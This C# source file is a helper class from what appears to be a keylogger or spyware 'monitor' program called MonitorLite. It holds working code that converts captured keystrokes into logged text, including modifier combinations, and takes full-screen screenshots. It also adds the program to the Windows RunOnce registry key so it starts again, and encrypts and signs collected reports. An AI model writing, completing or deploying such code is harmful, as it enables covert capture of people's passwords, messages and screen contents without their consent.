using Microsoft.Win32;
using MonitorLiteCommon;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace MonitorLiteCore
{
    static class Helpers
    {

        public static string ConvertStatus(int status)
        {
            switch (status)
            {
                case 0:
                    return "Disabled";
                case 1:
                    return "Enabled";
                default:
                    return "Unknown";
            }
        }

        public static byte[] EncryptReport(Report r,string publicKey)
        {
           // Report r = Report.CreateTextReport(reportTitle, reportText);
            byte[] reportData = Report.SerializeReport(r);
            byte[] encryptedReportData = Cryptographics.Encrypt(reportData, publicKey);
            byte[] signed = Cryptographics.HashSign(encryptedReportData, publicKey);
            return signed;
        }

        public static string GetExecutablePath()
        {
            using (Process p = Process.GetCurrentProcess())
            {
                using (ProcessModule pm = p.MainModule)
                    return pm.FileName;
            }
        }

        public static void SetStartup(string name)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").OpenSubKey("Windows").OpenSubKey("CurrentVersion").OpenSubKey("RunOnce",true);
            if (rk == null)
                return;
            using (rk)
            {
                rk.SetValue(name, GetExecutablePath());
            }
        } 

        public static bool TryConvertToLog(ushort key, out string s, out bool specialKeyword)
        {

            bool shift = (NativeMethods.GetAsyncKeyState(Keys.ShiftKey) != 0);
            bool altgr = (NativeMethods.GetAsyncKeyState(Keys.Menu) != 0);
            bool ctrl = (NativeMethods.GetAsyncKeyState(Keys.ControlKey) != 0);
            bool capsLock = (((NativeMethods.GetKeyState(Keys.Capital)) & 0x1) != 0);

            if (!TryGetSpecialKeys(key, out s))
            {
                s = GetCharsFromKeys(key, shift, altgr).ToLower();
                specialKeyword = false;
            }
            else
            {
                specialKeyword = true;
            }

            if (string.IsNullOrEmpty(s))
            {
                specialKeyword = false;
                return false;
            }

            if ((capsLock == true & shift == false) | (capsLock == false & shift == true))
            {
                s = s.ToUpper();
            }

            if (ctrl && !altgr)
            {
                s = string.Format("[CTRL+{0}]", s.ToUpper());
                specialKeyword = true;
            }

            return true;
        }

        private static string GetCharsFromKeys(ushort key, bool shift, bool altGr)
        {

            StringBuilder buf = new StringBuilder(256);
            byte[] keyboardState = new byte[256];

            if (shift)
            {
                keyboardState[Convert.ToInt32(Keys.ShiftKey)] = 0xff;
            }

            if (altGr)
            {
                keyboardState[Convert.ToInt32(Keys.ControlKey)] = 0xff;
                keyboardState[Convert.ToInt32(Keys.Menu)] = 0xff;
            }

            int rc = 0;
            rc = NativeMethods.ToUnicodeEx(Convert.ToUInt32(key), 0u, keyboardState, buf, buf.Capacity, 0u, InputLanguage.DefaultInputLanguage.Handle);

            switch (rc)
            {

                case -1:
                    // Its a dead key, like for example "`´" accents or "^".

                    return "";
                case 0:
                    // Single character in buffer.

                    return "";
                case 1:

                    return buf[0].ToString();
                default:
                    // Two or more (only two of them are relevant).

                    return buf.ToString().Substring(0, 2);
            }

        }

        private static bool TryGetSpecialKeys(ushort key, out string s)
        {
            s = string.Empty;
            switch ((Keys)key)
            {
                case Keys.RControlKey: { s = ""; return true; }
                case Keys.LControlKey: { s = ""; return true; }
                case Keys.RShiftKey: { s = ""; return true; }
                case Keys.LShiftKey: { s = ""; return true; }
                case Keys.Alt: { s = ""; return true; }
                case Keys.RMenu: { s = ""; return true; }
                case Keys.LMenu: { s = ""; return true; }
                case Keys.LWin: { s = "[WIN]"; return true; }
                case Keys.RWin: { s = "[WIN]"; return true; }
                case Keys.Escape: { s = "[ESC]"; return true; }
                case Keys.Delete: { s = "[DEL]"; return true; }
                case Keys.Home: { s = "[HOME]"; return true; }
                case Keys.Insert: { s = "[INS]"; return true; }
                case Keys.End: { s = "[END]"; return true; }
                case Keys.PageDown: { s = "[PGDOWN]"; return true; }
                case Keys.PageUp: { s = "[PGUP]"; return true; }
                case Keys.NumLock: { s = ""; return true; }
                case Keys.Scroll: { s = "[SCROLL]"; return true; }
                case Keys.PrintScreen: { s = "[PRINTSCREEN]"; return true; }
                case Keys.Pause: { s = "[PAUSE]"; return true; }

                case Keys.Enter: { s = "[ENTER]\r\n"; return true; }
                case Keys.Tab: { s = "[TAB]\t"; return true; }
                case Keys.CapsLock: { s = ""; return true; }
                case Keys.Up: { s = "[UP]"; return true; }
                case Keys.Down: { s = "[DOWN]"; return true; }
                case Keys.Left: { s = "[LEFT]"; return true; }
                case Keys.Right: { s = "[RIGHT]"; return true; }
                case Keys.Back: { s = "[BACK]"; return true; }
                case Keys.F1:
                case Keys.F2:
                case Keys.F3:
                case Keys.F4:
                case Keys.F5:
                case Keys.F6:
                case Keys.F7:
                case Keys.F8:
                case Keys.F9:
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                case Keys.F13:
                    {
                        s = string.Format("[{0}]", ((Keys)key).ToString());
                        return true;
                    }
                default: return false;
            }
        }

        public static Image TakeScreenshot()
        {

            // Create a bitmap of the appropriate size to receive the screenshot.
            using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
            {
                // Draw the screenshot into our bitmap.
                using (Graphics g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);
                }

                // Do something with the Bitmap here, like save it to a file:
                return (Bitmap)bmp.Clone();
            }
        }
    }
}
